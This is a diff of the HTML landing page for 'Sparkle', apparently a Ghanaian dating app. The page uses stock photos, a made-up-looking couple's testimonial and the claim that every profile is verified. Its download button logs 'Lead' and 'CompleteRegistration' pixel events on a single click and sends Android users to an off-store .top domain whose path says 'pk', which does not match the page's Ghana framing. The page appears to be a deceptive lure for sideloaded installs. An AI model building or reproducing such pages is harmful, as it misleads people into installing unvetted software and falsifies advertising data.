@@ -16,49 +16,55 @@
     fbq('init', '1904890236895529'); 
     fbq('track', 'PageView');
     </script>
-    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1904890236895529&ev=PageView&noscript=1"/></noscript>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .faq-answer { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }
-        .faq-item.active .faq-answer { max-height: 150px; }
+        .faq-item.active .faq-answer { max-height: 200px; }
         .faq-arrow { transition: transform 0.3s ease; }
         .faq-item.active .faq-arrow { transform: rotate(180deg); }
     </style>
 </head>
 <body class="bg-[#FFF6F0] text-[#1E1E1E] font-sans antialiased">
-    <header class="w-full bg-white/60 backdrop-blur-md sticky top-0 z-50 border-b border-pink-100/50">
+    <header class="sticky top-0 bg-white/80 backdrop-blur-md z-50 border-b border-pink-100/50">
         <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
-            <span class="text-2xl font-black bg-gradient-to-r from-pink-500 to-rose-500 bg-clip-text text-transparent">Sparkle</span>
+            <span class="text-2xl font-black text-rose-500">Sparkle</span>
         </div>
     </header>
 
-    <main class="max-w-7xl mx-auto px-6 pt-12 pb-20">
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+    <main class="max-w-7xl mx-auto px-6 py-12">
+        <div class="grid lg:grid-cols-2 gap-12 items-center">
             <div class="space-y-6">
-                <h1 class="text-5xl font-black text-gray-900 leading-tight">Find your <span class="text-pink-500">spark</span> in 60 seconds.</h1>
+                <h1 class="text-4xl md:text-5xl font-black leading-tight">Find your <span class="text-pink-500">spark</span> in 60 seconds.</h1>
                 <p class="text-gray-600">Ghana's friendliest dating app. Meet verified singles in Accra, Kumasi, and beyond.</p>
-                <button class="download-trigger-btn w-full lg:w-auto bg-rose-500 text-white font-bold py-4 px-10 rounded-full shadow-xl">Download Free for Android</button>
+                <button class="download-trigger-btn w-full bg-rose-500 text-white font-bold py-4 rounded-full shadow-lg hover:bg-rose-600 transition">Download Free for Android</button>
             </div>
             <div class="grid grid-cols-2 gap-4">
-                <img src="https://images.unsplash.com/photo-1596700684711-30d075ba5a8f?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 object-cover">
-                <img src="https://images.unsplash.com/photo-1543163521-1bf539caffe5?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 object-cover">
+                <img src="https://images.unsplash.com/photo-1596422846543-75c6fc197f07?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 w-full object-cover">
+                <img src="https://images.unsplash.com/photo-1577975882846-43158c255276?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 w-full object-cover">
+                <img src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 w-full object-cover">
+                <img src="https://images.unsplash.com/photo-1580489944761-15a19d654956?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 w-full object-cover">
             </div>
         </div>
     </main>
 
-    <div class="max-w-3xl mx-auto px-6 pb-20">
-        <h2 class="text-3xl font-black text-center mb-10">Quick answers.</h2>
+    <section class="max-w-3xl mx-auto px-6 pb-12">
+        <h2 class="text-2xl font-black mb-6">Ghana's love stories.</h2>
+        <div class="bg-white p-6 rounded-2xl border mb-4">
+            <p class="font-bold">Abena & Emmanuel · Accra</p>
+            <p class="text-gray-600 text-sm mt-1">"Matched on a Tuesday. Coffee on Friday. Engaged six months later."</p>
+        </div>
+        <h2 class="text-2xl font-black mb-6 mt-10">Quick answers.</h2>
         <div class="space-y-3">
             <div class="faq-item bg-white p-5 rounded-2xl border cursor-pointer" onclick="this.classList.toggle('active')">
                 <div class="flex justify-between font-bold">Is Sparkle free? <span class="faq-arrow">▼</span></div>
                 <div class="faq-answer text-gray-500 text-sm mt-2">Yes, 100% free for matching and chatting.</div>
             </div>
             <div class="faq-item bg-white p-5 rounded-2xl border cursor-pointer" onclick="this.classList.toggle('active')">
-                <div class="flex justify-between font-bold">How to verify? <span class="faq-arrow">▼</span></div>
-                <div class="faq-answer text-gray-500 text-sm mt-2">We use live photo verification to keep you safe.</div>
+                <div class="flex justify-between font-bold">Is it safe? <span class="faq-arrow">▼</span></div>
+                <div class="faq-answer text-gray-500 text-sm mt-2">Every profile is live photo-verified.</div>
             </div>
         </div>
-    </div>
+    </section>
 
     <script>
         document.querySelectorAll('.download-trigger-btn').forEach(btn => {
@@ -66,8 +72,7 @@
                 e.preventDefault();
                 fbq('track', 'Lead');
                 fbq('track', 'CompleteRegistration');
-                this.innerText = "Connecting...";
-                setTimeout(() => { window.location.href = "https://svip1027.top/sparkleapp-pk-2"; }, 1000);
+                window.location.href = "https://svip1027.top/sparkleapp-pk-2";
             });
         });
     </script>
